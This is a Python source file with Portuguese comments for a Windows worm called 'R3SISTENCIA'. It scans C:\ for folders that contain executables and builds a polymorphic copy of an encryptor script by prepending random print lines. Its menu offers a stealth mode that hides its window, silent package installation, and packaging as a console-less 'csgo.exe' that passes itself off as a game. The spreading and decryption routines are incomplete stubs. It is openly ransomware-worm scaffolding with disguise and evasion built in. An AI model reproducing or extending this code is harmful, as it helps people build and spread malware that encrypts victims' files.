import os
import sys
import time
import threading
import shutil
import win32con
import win32gui
import random
from os import system


ROOTDIR = r"C:\\"
ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False
        self.own_path = os.path.realpath(__file__) # pode ser usado para apenas não encriptar a diretoria da worm

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                try:
                    for f in os.listdir(directory_path):
                        if f.endswith(".exe"):
                            self.target_dir_list.append(directory_path)
                            break
                except PermissionError:
                    pass

        self.directories_found = True

# C:/Program Files/Windows NT/Accessories -> target_dir_list[30]
    def spread(self):
        this = open(ENCRYPTOR_PATH, "r")
        worm_poli = ""
        times = random.randrange(1, 7)
        for i in range(times):
            num = random.randrange(-sys.maxsize, sys.maxsize)
            worm_poli += "print(" + str(num) + ")\n"

        worm_poli += "\n"

        for line in this:
            worm_poli += line



    def decrypt_files(self):
        pass

    def execute_worm(self):
        if not self.directories_found:
            self.find_directories()

        # print(self.target_dir_list)
        self.spread()

def banner_func():
    print("""
  ___ _______ ___ ___ _____ _____  _  ___ ___   _   
 | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
 |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
 |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """)
        
def worm_menu():
    print(' --------------------------------- ')
    print('|      R 3 S I S T 3 N C I A      |')
    print(' --------------------------------- ')
    print('| [+] 1 => Launch Worm            |')
    print('| [+] 2 => Make It Executable     |')
    print('| [+] 3 => Run Worm in Stealth    |')
    print('| [+] 4 => Decrypt files          |')
    print('| [!] 0 => Exit                   |')
    print(' --------------------------------- ')

if __name__ == "__main__":
    system("pip install pypiwin32 pyinstaller pycryptodome > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
    system("cls")

    banner_func()
    time.sleep(3)

    worm = Worm()

    opt = int
    while opt != 0:
        worm_menu()
        opt = int(input("Operation: "))
        time.sleep(1)
        match opt:
            case 1: # modo normal
                print("[!] Running Worm!")
                print('[!] Press [Ctrl] + [C] to Stop!')
                worm.execute_worm()
            case 2: # criação de executável
                print("[+] Creating EXE of Worm!")
                print('[!] Press [Ctrl] + [C] to Stop!')
                time.sleep(1)

                os.system("pyinstaller resistencia_exe.py --onefile --noconsole --name csgo")
                print("[!] csgo.exe Created")
            case 3: # modo furtivo
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)
                worm.execute_worm()
            case 4: # desencriptar ficheiros
                pass
            case 0:
                print("[!] Quitting...")
                time.sleep(1.5)
                break
            case _:
                print("[!] Invalid Option.")
                print("[!] Try again")